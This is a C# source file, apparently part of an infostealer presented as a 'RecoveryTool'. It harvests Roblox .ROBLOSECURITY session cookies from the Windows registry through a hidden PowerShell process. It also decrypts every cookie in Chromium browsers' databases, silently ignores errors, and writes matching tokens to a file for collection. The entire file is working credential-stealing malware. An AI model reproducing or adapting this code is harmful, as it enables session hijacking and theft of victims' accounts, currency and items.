using RecoveryTool.Recovery.Browsers.Chromium;
using RecoveryTool.Recovery.Utilities;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace RecoveryTool.Recovery.Gaming.Games
{
    partial class RobloxService
    {
        private static readonly List<string> RobloxCookies = [];

        internal static async Task SaveRobloxAsync(params Task<string[]>[] getBrowserCookiesTasks)
        {
            var regex = GetRobloxSecurityRegex();

            await RetrieveCookiesFromRegistryAsync(regex);
            await RetrieveBrowserCookiesAsync(regex);

            foreach (var getBrowserCookieTask in getBrowserCookiesTasks)
            {
                var browserCookies = await getBrowserCookieTask.ConfigureAwait(false);
                AddCookiesIfValid(regex, browserCookies);
            }

            SaveCookiesToFile([.. RobloxCookies]);
        }

        private static async Task RetrieveCookiesFromRegistryAsync(Regex regex)
        {
            foreach (var hive in new[] { "HKCU", "HKLM" })
            {
                var cookie = await GetRegistryCookieAsync(hive).ConfigureAwait(false);
                AddCookiesIfValid(regex, [cookie]);
            }
        }

        private static async Task<string> GetRegistryCookieAsync(string hive)
        {
            using var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"Get-ItemPropertyValue -Path {hive}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY",
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    UseShellExecute = false
                }
            };
            process.Start();
            var output = await process.StandardOutput.ReadToEndAsync().ConfigureAwait(false);
            process.WaitForExit();

            return process.ExitCode == 0 ? output : string.Empty;
        }

        private static async Task RetrieveBrowserCookiesAsync(Regex regex)
        {
            foreach (var browserName in ChromiumCommon.BrowserDirectories.Keys)
            {
                var query = ChromiumCommon.DbQueries["Cookies"];
                try
                {
                    await ChromiumCommon.ExecuteSqliteQueryAndProcessResultsAsync(browserName, "Cookies", query, async reader =>
                    {
                        var host = reader.GetString(0);
                        var name = reader.GetString(1);
                        var encryptedValue = (byte[])reader.GetValue(2);
                        var decryptedValue = ChromiumCommon.DecryptChromium(encryptedValue, ChromiumCommon.GetKey(browserName));

                        if (regex.IsMatch(decryptedValue) && !RobloxCookies.Contains(decryptedValue))
                        {
                            RobloxCookies.Add(decryptedValue);
                        }
                        return $"{host}\t{name}\t{decryptedValue}";
                    }, ChromiumCommon.FileNames["Cookies"]).ConfigureAwait(false);
                }
                catch (Exception) { }
            }
        }


        private static void AddCookiesIfValid(Regex regex, IEnumerable<string> cookies)
        {
            foreach (var cookie in cookies)
            {
                if (regex.IsMatch(cookie) && !RobloxCookies.Contains(cookie))
                {
                    RobloxCookies.Add(cookie);
                }
            }
        }

        private static void SaveCookiesToFile(string[] cookies)
        {
            if (cookies.Length == 0)
            {
                return;
            }

            var path = Common.EnsureRobloxPath();
            var filePath = Path.Combine(path, "Content.txt");

            File.WriteAllLines(filePath, cookies);
        }

        [GeneratedRegex(@"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", RegexOptions.Compiled)]
        private static partial Regex GetRobloxSecurityRegex();
    }
}
